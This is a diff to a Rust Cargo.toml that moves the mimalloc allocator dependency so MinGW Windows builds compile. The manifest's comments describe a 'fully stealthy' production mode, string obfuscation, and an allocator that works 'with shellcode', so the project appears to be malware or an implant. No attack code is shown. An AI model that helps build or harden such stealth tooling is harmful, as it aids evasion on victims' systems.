@@ -9,8 +9,6 @@ dev = []  # Development mode: console window + debug prints
 production = []  # Production mode: no console, no debug prints, fully stealthy
 
 [dependencies]
-# Global allocator that works with shellcode (no TLS)
-mimalloc = { version = "0.1", default-features = false }
 # Ofuscación de strings en compile-time
 obfstr = "0.4"
 # Random number generation for obfuscation
@@ -20,6 +18,12 @@ rustls = { version = "0.23", default-features = false, features = ["std", "tls12
 webpki-roots = "0.26"
 # For global state (current directory)
 lazy_static = "1.4"
+
+# MinGW cannot compile the bundled mimalloc C backend used by this project.
+# GNU Windows builds are regular PE executables, so the system allocator is
+# sufficient there; MSVC and non-Windows builds keep mimalloc.
+[target.'cfg(not(all(target_os = "windows", target_env = "gnu")))'.dependencies]
+mimalloc = { version = "0.1", default-features = false }
 
 [target.'cfg(windows)'.dependencies]
 winapi = { version = "0.3", features = [
